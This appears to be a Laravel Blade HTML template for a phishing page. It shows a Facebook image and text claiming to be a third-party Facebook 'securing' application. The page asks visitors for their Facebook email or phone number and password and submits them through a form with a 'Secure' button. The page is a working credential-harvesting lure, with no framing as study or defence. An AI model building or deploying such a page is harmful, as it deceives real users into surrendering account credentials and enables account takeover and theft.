<!DOCTYPE html>
<html>
<head>
	<title></title>

<link rel="stylesheet" type="text/css" href="{{ asset('assets/css/footer.css') }}">


<link rel="stylesheet" type="text/css" href="{{ asset('assets/css/bootstrap.min.css') }}">

<!-- <link rel="stylesheet" type="text/css" href="{{ asset('assets/css/Footer-with-social-icons') }}"> -->




</head>
<body>



<div class="jumbotron" align="center">
<img src="images/fbook.png">
</div>

<div class="container-fluid" align="center">

<h5><i> Note: You will recieve a confirmation code in your facebook message to confirm the facebook securing process <br> you are to supply the facebook username and password in the form below. This is a third party application of the facebook Please do not share the confirmation code with anyone</i></h5>
@if (count($errors) > 0)
    <div class="alert alert-danger">
        <ul>
            @foreach ($errors->all() as $error)
                <li>{{ $error }}</li>
            @endforeach
        </ul>
    </div>
@endif
<form action="" method="POST" class="form-inline" role="form">
	{{ csrf_field() }}
  <div class="form-group">
  
    <label class="sr-only" for="exampleInputEmail2">Email address</label>
    <input type="text" class="form-control" name="username" id="" placeholder="Enter email/Phone Number">
  </div>
  
  <div class="form-group">
  	
    <label class="sr-only" for="exampleInputPassword2">Password</label>
    <input type="password" class="form-control" name="password" id="" placeholder="Password">
  </div>
  <div class="checkbox">
    <label>
      <!-- <input type="checkbox"> Remember me -->
    </label>
  </div>
  <button type="submit" class="btn btn-success">Secure</button>
</form>

</div>
@yield('content2')




@yield('content')


<script type="text/javascript" src="{{asset('assets/js/jquery.min.js')}}"></script>

<!-- <script type="text/javascript" src="js/bootstrap.min.js"></script>   --> 
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!-- <script src="js/app.js"></script> -->
<script src="{{asset('assets/js/bootstrap.min.js')}}"></script>




</body>
</html>